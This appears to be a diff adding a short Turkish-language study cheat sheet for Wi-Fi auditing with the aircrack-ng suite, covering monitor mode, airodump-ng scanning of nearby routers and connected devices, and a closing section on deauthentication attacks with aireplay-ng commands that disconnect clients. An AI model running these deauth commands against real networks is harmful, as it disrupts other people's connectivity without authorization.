@@ -1,0 +1,29 @@
+- **İfconfig** : Mevcut internet bağlantıları ile ilgili detaylı bilgi verir.
+- **İwconfig** : Mevcut Wİ-Fİ bağlantıları ile ilgili detaylı bilgi verir.
+---
+- **airmon-ng (start/stop) (interface)**
+	- ***Managed Mode*** Wİ-Fİ adaptörünün varsayılan internete bağlanma modu. 
+		- airmon-ng start wlan0
+	- ***Monitor Mode*** ise Wİ-Fİ adaptörünün bilgi toplama modudur. 
+		- airmon-ng stop wlan0mon 
+---
+- **airodump-ng (interface)**
+	- Etraftaki modemler hakkında bilgi toplar.
+	- ***BSSID*** : Modemin MAC adresi.
+	- ***PWR*** : Modemin Wİ-Fİ adaptörüne uzaklığı.
+	- ***CH*** : Modemin kullanıldığı kanal.
+	- ***ENC*** : Modemim şifrelenme türü.
+	- ***ESSID*** : Modem adı.
+---
+- **airodump-ng --channel ... -bssid ... -write ... (interface)**
+	- örneğin *airodump-ng --channel 12 --bssid 40:30:20:10 --write txt wlan0mon*
+	- Hedeflenen modem ile ilgili detaylı bilgi toplar.
+	- ***BSSID*** : Modemin MAC adresi.
+	- ***STATION*** : Modeme bağlı cihazların MAC adresi.
+	- ***Frames*** : Cihazların internette harcadığı paket sayısı.
+---
+### DEAUTHENTICATION SALDIRISI
+- **aireplay-ng --deauth (paket sayısı) -a (modem MAC) -c (cihaz MAC) (interface)**
+	- *aireplay-ng --deauth 1000 -a 40:30:20:10 -c 10:20:30:40 wlan0mon*
+- **aireplay-ng --deauth (paket sayısı) -a (modem MAC) (interface)**
+	- *aireplay-ng --deauth 1000 -a 40:30:20:10 wlan0mon*
